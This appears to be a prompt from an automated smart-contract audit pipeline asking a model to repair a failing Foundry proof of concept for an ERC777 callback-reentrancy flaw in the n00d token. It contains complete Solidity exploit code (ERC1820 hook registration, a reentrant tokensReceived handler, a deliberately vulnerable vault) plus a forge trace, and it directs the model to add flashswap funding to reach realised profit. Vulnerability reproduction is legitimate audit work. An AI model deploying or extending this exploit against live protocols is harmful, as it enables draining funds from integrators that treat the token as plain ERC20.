You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: ERC20-looking transfers still execute ERC777 recipient hooks, enabling callback reentrancy in integrators
- claim: Both ERC20 entrypoints, `transfer()` and `transferFrom()`, route through `_send(..., false)`. Although `false` disables the mandatory recipient-ack check, `_send()` still invokes `_callTokensReceived()` after crediting the recipient, so a recipient contract registered in ERC1820 can reenter downstream protocols even when they believe they are interacting with a callback-free ERC20 token.
- impact: Any vault, AMM, staking contract, bridge, router, or lending market that treats `n00d` as a plain ERC20 can be reentered in the middle of deposit/withdraw/swap flows, leading to double-withdrawals, stale-accounting exploits, or fund theft. The local `FlawVerifier` demonstrates this exact pattern against a toy vault.
- exploit_paths: ["An integrating protocol calls `transfer()` or `transferFrom()` on `n00d` during a state-changing flow and assumes the token transfer has no callback.", "The attacker-controlled recipient contract registers an `ERC777TokensRecipient` hook in ERC1820.", "`_send()` credits the recipient, then `tokensReceived()` reenters the still-in-progress protocol before its internal accounting/effects are finalized."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC1820Registry {
    function setInterfaceImplementer(address account, bytes32 interfaceHash, address implementer) external;
    function getInterfaceImplementer(address account, bytes32 interfaceHash) external view returns (address);
}

interface IERC1820Implementer {
    function canImplementInterfaceForAddress(bytes32 interfaceHash, address account) external view returns (bytes32);
}

interface IERC777Recipient {
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external;
}

/*
    Toy integrator used to preserve the exact F-002 causality.

    Relevant path anchors:
    1. The protocol uses ERC20-looking entrypoints `transferFrom()` and `transfer()`.
    2. For n00d, both `transfer()` and `transferFrom()` route through ERC777 `_send(..., false)`.
    3. `_send()` still credits the recipient and then calls `tokensReceived()` when the recipient
       is registered in ERC1820, so a recipient hook can reenter before this vault finalizes effects.

    `deposit()` and `donate()` exercise the integrator's `transferFrom()` flow.
    `withdraw()` is intentionally vulnerable because it does `transfer()` before updating shares.
*/
contract VulnerableN00dVault {
    IERC20Like internal immutable TOKEN;

    mapping(address => uint256) public shares;

    constructor(address token_) {
        TOKEN = IERC20Like(token_);
    }

    function deposit(uint256 amount) external {
        require(amount != 0, "deposit=0");
        require(TOKEN.transferFrom(msg.sender, address(this), amount), "deposit transfer failed");
        shares[msg.sender] += amount;
    }

    function donate(uint256 amount) external {
        require(amount != 0, "donate=0");
        require(TOKEN.transferFrom(msg.sender, address(this), amount), "donation transfer failed");
    }

    function withdraw(uint256 amount) external {
        uint256 credited = shares[msg.sender];
        require(credited >= amount, "insufficient shares");

        // Interaction before effects: n00d `transfer()` reaches ERC777 `_send()`,
        // which can invoke recipient `tokensReceived()` before shares are reduced.
        require(TOKEN.transfer(msg.sender, amount), "withdraw transfer failed");
        shares[msg.sender] = credited - amount;
    }

    function liquidBalance() external view returns (uint256) {
        return TOKEN.balanceOf(address(this));
    }
}

contract FlawVerifier is IERC1820Implementer, IERC777Recipient {
    address internal constant NOOD = 0x2321537fd8EF4644BacDCEec54E5F35bf44311fA;
    IERC1820Registry internal constant ERC1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    bytes32 internal constant ERC1820_ACCEPT_MAGIC = keccak256("ERC1820_ACCEPT_MAGIC");
    bytes32 internal constant TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");

    VulnerableN00dVault public vault;

    bool public executed;
    bool public hookRegistered;
    bool public hookObserved;
    bool public reentered;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    bool public transferFromLegUsed;
    bool public transferLegUsed;

    uint256 public startingBalance;
    uint256 public endingBalance;
    uint256 public depositedAmount;
    uint256 public donatedLiquidity;
    uint256 public reenteredWithdrawAmount;
    uint256 public hookCallCount;
    uint256 internal realizedProfit;

    string public exploitPathUsed;
    string public concreteInfeasibility;

    constructor() {}

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        IERC20Like nood = IERC20Like(NOOD);
        startingBalance = nood.balanceOf(address(this));

        exploitPathUsed =
            "integrator uses n00d transferFrom() and later transfer() as if they were callback-free ERC20 operations; attacker registers ERC1820 ERC777TokensRecipient; n00d routes those ERC20 entrypoints through _send(..., false), and during withdraw _send() credits the attacker then invokes tokensReceived(), which reenters withdraw before share accounting is finalized";

        _registerRecipientHook();
        vault = new VulnerableN00dVault(NOOD);

        if (startingBalance >= 2) {
            require(nood.approve(address(vault), type(uint256).max), "approve failed");

            depositedAmount = startingBalance / 2;
            donatedLiquidity = startingBalance - depositedAmount;

            vault.deposit(depositedAmount);
            transferFromLegUsed = true;

            if (donatedLiquidity != 0) {
                vault.donate(donatedLiquidity);
            }

            reenteredWithdrawAmount = depositedAmount;
            transferLegUsed = true;
            vault.withdraw(depositedAmount);
        } else if (startingBalance == 1) {
            require(nood.approve(address(vault), type(uint256).max), "approve failed");

            // With only 1 pre-existing n00d, the verifier can still exercise the full callback path:
            // `deposit()` uses `transferFrom()`, and `withdraw(0)` uses `transfer()` which reaches
            // `_send()` and fires `tokensReceived()`. Profit is infeasible because there is no spare
            // vault liquidity to satisfy a non-zero reentrant second withdrawal.
            depositedAmount = 1;
            donatedLiquidity = 0;
            vault.deposit(1);
            transferFromLegUsed = true;

            reenteredWithdrawAmount = 0;
            transferLegUsed = true;
            vault.withdraw(0);

            concreteInfeasibility =
                "Only 1 verifier-held n00d was available at execution, so the ERC20-entrypoint ERC777 callback reentrancy is reproducible but a positive non-zero reentrant drain is not: the vault has no extra liquid n00d beyond the single credited share.";
        } else {
            reenteredWithdrawAmount = 0;
            transferLegUsed = true;

            // No verifier-held n00d exists, so `transferFrom()` cannot be funded without adding
            // external capital. The verifier therefore falls back to the minimal direct path that
            // still proves the root cause: `withdraw(0)` triggers n00d `transfer()`, which reaches
            // ERC777 `_send()` and invokes recipient `tokensReceived()` on the registered attacker.
            vault.withdraw(0);

            concreteInfeasibility =
                "No verifier-held n00d exists at the fork block, so a funded transferFrom()-based seed leg cannot be executed without temporary outside capital. The direct zero-amount path still proves that ERC20-looking transfer() reaches _send() and triggers tokensReceived()-driven reentrancy.";
        }

        endingBalance = nood.balanceOf(address(this));
        if (endingBalance > startingBalance) {
            realizedProfit = endingBalance - startingBalance;
        }

        hypothesisValidated = hookRegistered && hookObserved && reentered && transferLegUsed;
        hypothesisRefuted = !hypothesisValidated;

        if (realizedProfit == 0 && bytes(concreteInfeasibility).length == 0) {
            concreteInfeasibility =
                "No independent victim-funded integration is provided in the workspace or finding inputs. This verifier reproduces the ERC20-entrypoint ERC777 callback reentrancy, and with verifier-seeded n00d demonstrates stale-accounting double-withdrawal mechanics, but without third-party liquidity at the fork block there is no net-profitable drain.";
        }
    }

    function canImplementInterfaceForAddress(bytes32 interfaceHash, address account)
        external
        view
        override
        returns (bytes32)
    {
        if (account == address(this) && interfaceHash == TOKENS_RECIPIENT_INTERFACE_HASH) {
            return ERC1820_ACCEPT_MAGIC;
        }
        return bytes32(0);
    }

    function tokensReceived(
        address,
        address,
        address to,
        uint256,
        bytes calldata,
        bytes calldata
    ) external override {
        require(msg.sender == NOOD, "unexpected token");
        require(to == address(this), "unexpected recipient");

        hookObserved = true;
        hookCallCount += 1;

        if (!reentered) {
            reentered = true;
            vault.withdraw(reenteredWithdrawAmount);
        }
    }

    function profitToken() external view returns (address) {
        return realizedProfit == 0 ? address(0) : NOOD;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfit;
    }

    function _registerRecipientHook() internal {
        if (hookRegistered) {
            return;
        }

        ERC1820.setInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this));
        hookRegistered = ERC1820.getInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH) == address(this);
        require(hookRegistered, "hook registration failed");
    }
}

```

forge stdout (tail):
```
6b541ddaa720db2b10a4d0cdac39b8d360425fc073085fac19bc82614677987
    │   │   │   │        topic 1: 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
    │   │   │   │        topic 2: 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
    │   │   │   │        topic 3: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │        topic 1: 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
    │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   ├─ [942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
    │   │   │   │   └─ ← [Return] FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]
    │   │   │   ├─ [37080] FlawVerifier::tokensReceived(VulnerableN00dVault: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], VulnerableN00dVault: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0, 0x, 0x)
    │   │   │   │   ├─ [13239] VulnerableN00dVault::withdraw(0)
    │   │   │   │   │   ├─ [12221] 0x2321537fd8EF4644BacDCEec54E5F35bf44311fA::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0)
    │   │   │   │   │   │   ├─ [942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(VulnerableN00dVault: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   │   │   │   │   ├─  emit topic 0: 0x06b541ddaa720db2b10a4d0cdac39b8d360425fc073085fac19bc82614677987
    │   │   │   │   │   │   │        topic 1: 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
    │   │   │   │   │   │   │        topic 2: 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
    │   │   │   │   │   │   │        topic 3: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │   │        topic 1: 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
    │   │   │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   │   ├─ [942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]
    │   │   │   │   │   │   ├─ [1257] FlawVerifier::tokensReceived(VulnerableN00dVault: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], VulnerableN00dVault: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0, 0x, 0x)
    │   │   │   │   │   │   │   └─ ← [Return]
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   └─ ← [Return]
    │   │   │   │   └─ ← [Stop]
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return]
    │   ├─ [645] 0x2321537fd8EF4644BacDCEec54E5F35bf44311fA::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return]
    ├─ [500] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [528] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.18s (2.18ms CPU time)

Ran 1 test suite in 1.32s (1.18s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 971417)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
